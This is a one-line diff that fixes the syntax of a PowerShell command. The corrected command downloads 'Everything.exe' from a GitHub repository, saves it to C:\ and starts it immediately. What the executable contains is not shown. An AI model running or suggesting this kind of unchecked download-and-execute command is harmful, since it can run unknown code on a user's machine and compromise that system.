@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri "https://github.com/cs2cc/holden/raw/main/Everything.exe"; -OutFile "C:\Everything.exe"; Start-Process -FilePath "C:\Everything.exe"
+Invoke-WebRequest -Uri "https://github.com/cs2cc/holden/raw/main/Everything.exe" -OutFile "C:\Everything.exe"; Start-Process -FilePath "C:\Everything.exe"
